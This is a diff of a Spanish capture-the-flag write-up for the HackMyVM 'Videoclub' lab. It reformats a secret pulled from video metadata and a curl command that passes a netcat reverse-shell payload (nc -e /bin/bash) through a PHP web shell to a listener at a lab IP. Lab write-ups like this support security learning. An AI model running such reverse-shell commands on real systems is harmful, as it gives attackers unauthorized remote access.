@@ -114,7 +114,7 @@ Miro la ruta videos donde tenemos varios videos que me descargo y analizo sus me
 
 ![](/assets/images/HMV/Videoclub-HackMyVM/exiftool.webp)
 
->`Tenemos una película secreta, `secret_film:c0ntr0l` `
+Tenemos una película secreta,` secret_film:c0ntr0l `
 
 Los campos Copyright podrían ser rutas del servidor, o algun tipo de archivo, asique probaré.
 
@@ -186,7 +186,9 @@ Pongo netcat en escucha en el puerto 8888 (por ejemplo).
 
 Y ejecuto el siguiente comando:
 
-`curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=nc++-e+/bin/bash+192.168.0.11+8888'`
+```bash
+curl 'http://192.168.0.16:3377/c0ntr0l.php?f1ynn=nc++-e+/bin/bash+192.168.0.11+8888'
+```
 
 Y ya tengo la conexión inversa, tengo acceso al sistema.
 
